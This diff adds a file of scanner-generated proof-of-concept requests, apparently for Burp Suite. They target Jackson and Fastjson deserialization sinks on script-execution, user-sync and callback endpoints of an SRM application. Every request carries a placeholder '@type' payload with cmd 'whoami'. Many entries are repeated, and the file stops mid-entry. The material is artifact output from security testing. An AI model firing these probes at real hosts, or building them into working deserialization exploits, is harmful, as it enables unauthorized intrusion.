@@ -1,0 +1,1424 @@
+### JByteScanner Generated PoCs ###
+### Import these into Burp Suite Repeater ###
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/auto-fill-form
+Source: <org.srm.adaptor.api.controller.v1.AdaptorAutoFillFormController: org.springframework.http.ResponseEntity fillForm(java.lang.Long,java.lang.String,java.util.Map)>
+==================================================
+POST /v1/123/auto-fill-form HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"key": {"@type":"com.example.Evil","cmd":"whoami"}}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/adaptor-entity-structures/import
+Source: <org.srm.adaptor.api.controller.v1.AdaptorEntityStructureController: org.springframework.http.ResponseEntity importAdaptorEntityStructure(java.lang.String)>
+==================================================
+POST /v1/adaptor-entity-structures/import HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"@type":"com.example.Evil","cmd":"whoami"}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/adaptor-test-case/adapterTest
+Source: <org.srm.adaptor.api.controller.v1.AdaptorTestCaseController: org.springframework.http.ResponseEntity adapterTest(java.lang.Long,java.lang.String,java.lang.String,java.util.Map)>
+==================================================
+POST /v1/adaptor-test-case/adapterTest HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"key": {"@type":"com.example.Evil","cmd":"whoami"}}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/js-execute/js-test
+Source: <org.srm.adaptor.api.controller.v1.JsExecuteController: org.springframework.http.ResponseEntity jsTest(java.lang.String,java.lang.String)>
+==================================================
+POST /v1/js-execute/js-test HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"@type":"com.example.Evil","cmd":"whoami"}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/fake-tx-callback/db-operation
+Source: <org.srm.boot.marmotscript.faketx.controller.FakeTxFastController: org.springframework.http.ResponseEntity dbOperation(java.lang.String,java.lang.String)>
+==================================================
+POST /v1/fake-tx-callback/db-operation HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"@type":"com.example.Evil","cmd":"whoami"}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/fake-tx-callback/lov-query
+Source: <org.srm.boot.marmotscript.faketx.controller.FakeTxFastController: org.springframework.http.ResponseEntity lovQuery(java.lang.String,java.lang.String)>
+==================================================
+POST /v1/fake-tx-callback/lov-query HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"@type":"com.example.Evil","cmd":"whoami"}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/fake-tx-callback/query-block
+Source: <org.srm.boot.marmotscript.faketx.controller.FakeTxFastController: org.springframework.http.ResponseEntity queryBlock(java.lang.String,java.lang.String)>
+==================================================
+POST /v1/fake-tx-callback/query-block HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"@type":"com.example.Evil","cmd":"whoami"}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/script-fake-tx-callback/{functionName}
+Source: <org.srm.boot.marmotscript.faketx.controller.FakeTxUniversalController: org.springframework.http.ResponseEntity callback(org.srm.boot.marmotscript.iface.vo.FakeTxCallBackRequestVO)>
+==================================================
+POST /v1/script-fake-tx-callback/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.boot.marmotscript.iface.vo.FakeTxCallBackRequestVO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/script-fake-tx-callback/{functionName}
+Source: <org.srm.boot.marmotscript.faketx.controller.FakeTxUniversalController: org.springframework.http.ResponseEntity callback(org.srm.boot.marmotscript.iface.vo.FakeTxCallBackRequestVO)>
+==================================================
+POST /v1/script-fake-tx-callback/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.boot.marmotscript.iface.vo.FakeTxCallBackRequestVO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/script-fake-tx-callback/{functionName}
+Source: <org.srm.boot.marmotscript.faketx.controller.FakeTxUniversalController: org.springframework.http.ResponseEntity callback(org.srm.boot.marmotscript.iface.vo.FakeTxCallBackRequestVO)>
+==================================================
+POST /v1/script-fake-tx-callback/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.boot.marmotscript.iface.vo.FakeTxCallBackRequestVO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/script-fake-tx-callback/{functionName}
+Source: <org.srm.boot.marmotscript.faketx.controller.FakeTxUniversalController: org.springframework.http.ResponseEntity callback(org.srm.boot.marmotscript.iface.vo.FakeTxCallBackRequestVO)>
+==================================================
+POST /v1/script-fake-tx-callback/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.boot.marmotscript.iface.vo.FakeTxCallBackRequestVO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/script-debug/run
+Source: <org.srm.boot.marmotscript.faketx.controller.ScriptDebugController: org.springframework.http.ResponseEntity debugMarmotScriptApi(java.lang.String,java.lang.String)>
+==================================================
+POST /v1/script-debug/run HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"@type":"com.example.Evil","cmd":"whoami"}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/script-debug/run
+Source: <org.srm.boot.marmotscript.faketx.controller.ScriptDebugOrgController: org.springframework.http.ResponseEntity debugMarmotScriptApi(java.lang.String,java.lang.String)>
+==================================================
+POST /v1/123/script-debug/run HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"@type":"com.example.Evil","cmd":"whoami"}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/marmotScript/execute-marmot-script
+Source: <org.srm.container.api.controller.v1.MarmotScriptController: java.lang.String executeMarmotScript(java.lang.String,javax.servlet.http.HttpServletRequest)>
+==================================================
+POST /v1/marmotScript/execute-marmot-script HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"@type":"com.example.Evil","cmd":"whoami"}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/marmotScript/execute-with-content-and-log
+Source: <org.srm.container.api.controller.v1.MarmotScriptController: org.springframework.http.ResponseEntity executeWithContentAndLog(java.lang.String)>
+==================================================
+POST /v1/marmotScript/execute-with-content-and-log HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{"@type":"com.example.Evil","cmd":"whoami"}
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/script/execute-with-content
+Source: <org.srm.container.api.controller.v1.ScriptController: org.springframework.http.ResponseEntity executeWithContent(org.srm.container.api.dto.ScriptAndParamDTO)>
+==================================================
+POST /v1/script/execute-with-content HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.container.api.dto.ScriptAndParamDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/script/execute-with-content-and-log
+Source: <org.srm.container.api.controller.v1.ScriptController: org.springframework.http.ResponseEntity executeWithContentAndLog(org.srm.container.api.dto.ScriptAndParamDTO)>
+==================================================
+POST /v1/script/execute-with-content-and-log HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.container.api.dto.ScriptAndParamDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/company-import/user-account
+Source: <org.srm.iam.api.controller.v1.CompanyImportController: java.util.List userAccountImport(java.util.List)>
+==================================================
+POST /v1/company-import/user-account HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+[{"@type":"com.example.Evil","cmd":"whoami"}]
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/company-import/user-account
+Source: <org.srm.iam.api.controller.v1.CompanyImportController: java.util.List userAccountImport(java.util.List)>
+==================================================
+POST /v1/company-import/user-account HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+[{"@type":"com.example.Evil","cmd":"whoami"}]
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/company-import/user-account
+Source: <org.srm.iam.api.controller.v1.CompanyImportController: java.util.List userAccountImport(java.util.List)>
+==================================================
+POST /v1/company-import/user-account HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+[{"@type":"com.example.Evil","cmd":"whoami"}]
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/user/synchronize
+Source: <org.srm.iam.api.controller.v1.UserSynchronizeController: org.springframework.http.ResponseEntity createUser(java.lang.Long,org.srm.iam.api.dto.UserDTO)>
+==================================================
+POST /v1/123/user/synchronize HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.iam.api.dto.UserDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/{organizationId}/user/synchronize
+Source: <org.srm.iam.api.controller.v1.UserSynchronizeController: org.springframework.http.ResponseEntity createUser(java.lang.Long,org.srm.iam.api.dto.UserDTO)>
+==================================================
+POST /v1/123/user/synchronize HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.iam.api.dto.UserDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/user/synchronize
+Source: <org.srm.iam.api.controller.v1.UserSynchronizeController: org.springframework.http.ResponseEntity createUser(java.lang.Long,org.srm.iam.api.dto.UserDTO)>
+==================================================
+POST /v1/123/user/synchronize HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.iam.api.dto.UserDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/user/synchronize/authority
+Source: <org.srm.iam.api.controller.v1.UserSynchronizeController: org.springframework.http.ResponseEntity userAuthority(java.lang.Long,org.srm.iam.api.dto.UserDTO)>
+==================================================
+POST /v1/123/user/synchronize/authority HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.iam.api.dto.UserDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/{organizationId}/user/synchronize/authority
+Source: <org.srm.iam.api.controller.v1.UserSynchronizeController: org.springframework.http.ResponseEntity userAuthority(java.lang.Long,org.srm.iam.api.dto.UserDTO)>
+==================================================
+POST /v1/123/user/synchronize/authority HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.iam.api.dto.UserDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/{organizationId}/user/synchronize/authority
+Source: <org.srm.iam.api.controller.v1.UserSynchronizeController: org.springframework.http.ResponseEntity userAuthority(java.lang.Long,org.srm.iam.api.dto.UserDTO)>
+==================================================
+POST /v1/123/user/synchronize/authority HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.iam.api.dto.UserDTO",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/marmot-report/print/{templateCode}
+Source: <org.srm.marmot.controller.MarmotReportController: void print(java.lang.String,java.lang.Long,java.util.HashMap,javax.servlet.http.HttpServletResponse)>
+==================================================
+POST /v1/123/marmot-report/print/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "java.util.HashMap",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/third-party-callback/ding-talk/{appClient}
+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyCallbackController: org.springframework.http.ResponseEntity dingTalk(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,org.srm.mobile.config.api.dto.DingTalkResponse)>
+==================================================
+POST /v1/third-party-callback/ding-talk/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.mobile.config.api.dto.DingTalkResponse",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/third-party-callback/ding-talk/{appClient}
+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyCallbackController: org.springframework.http.ResponseEntity dingTalk(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,org.srm.mobile.config.api.dto.DingTalkResponse)>
+==================================================
+POST /v1/third-party-callback/ding-talk/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.mobile.config.api.dto.DingTalkResponse",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/third-party-callback/ding-talk/{appClient}
+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyCallbackController: org.springframework.http.ResponseEntity dingTalk(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,org.srm.mobile.config.api.dto.DingTalkResponse)>
+==================================================
+POST /v1/third-party-callback/ding-talk/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.mobile.config.api.dto.DingTalkResponse",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/third-party-callback/ding-talk/{appClient}
+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyCallbackController: org.springframework.http.ResponseEntity dingTalk(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,org.srm.mobile.config.api.dto.DingTalkResponse)>
+==================================================
+POST /v1/third-party-callback/ding-talk/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.mobile.config.api.dto.DingTalkResponse",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/third-party-callback/ding-talk/{appClient}
+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyCallbackController: org.springframework.http.ResponseEntity dingTalk(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,org.srm.mobile.config.api.dto.DingTalkResponse)>
+==================================================
+POST /v1/third-party-callback/ding-talk/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.mobile.config.api.dto.DingTalkResponse",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/third-party-callback/ding-talk/{appClient}
+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyCallbackController: org.springframework.http.ResponseEntity dingTalk(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,org.srm.mobile.config.api.dto.DingTalkResponse)>
+==================================================
+POST /v1/third-party-callback/ding-talk/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.mobile.config.api.dto.DingTalkResponse",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/third-party-callback/ding-talk/{appClient}
+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyCallbackController: org.springframework.http.ResponseEntity dingTalk(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,org.srm.mobile.config.api.dto.DingTalkResponse)>
+==================================================
+POST /v1/third-party-callback/ding-talk/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.mobile.config.api.dto.DingTalkResponse",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: com.alibaba.fastjson.JSONObject parseObject(java.lang.String)>
+Route: POST /v1/third-party-callback/ding-talk/{appClient}
+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyCallbackController: org.springframework.http.ResponseEntity dingTalk(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,org.srm.mobile.config.api.dto.DingTalkResponse)>
+==================================================
+POST /v1/third-party-callback/ding-talk/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.mobile.config.api.dto.DingTalkResponse",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Fastjson_Deserialization
+Sink: <com.alibaba.fastjson.JSON: java.lang.Object parse(java.lang.String)>
+Route: POST /v1/third-party-callback/ding-talk/{appClient}
+Source: <org.srm.mobile.config.api.controller.v1.ThirdPartyCallbackController: org.springframework.http.ResponseEntity dingTalk(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,org.srm.mobile.config.api.dto.DingTalkResponse)>
+==================================================
+POST /v1/third-party-callback/ding-talk/123 HTTP/1.1
+Host: {{TARGET_HOST}}
+User-Agent: JByteScanner/1.0
+Content-Type: application/json
+Accept: */*
+
+{
+  "_typeHint": "org.srm.mobile.config.api.dto.DingTalkResponse",
+  "payload": {"@type":"com.example.Evil","cmd":"whoami"},
+  "data": {"@type":"com.example.Evil","cmd":"whoami"},
+  "content": {"@type":"com.example.Evil","cmd":"whoami"},
+  "value": {"@type":"com.example.Evil","cmd":"whoami"},
+  "body": {"@type":"com.example.Evil","cmd":"whoami"}
+}
+
+
+
+==================================================
+Vulnerability: Jackson_Deserialization
+Sink: <com.fasterxml.jackson.databind.ObjectMapper: java.lang.Object readValue(java.lang.String,java.lang.Class)>
+Route: POST /v1/{organizationId}/third-party-relations/auto-bind
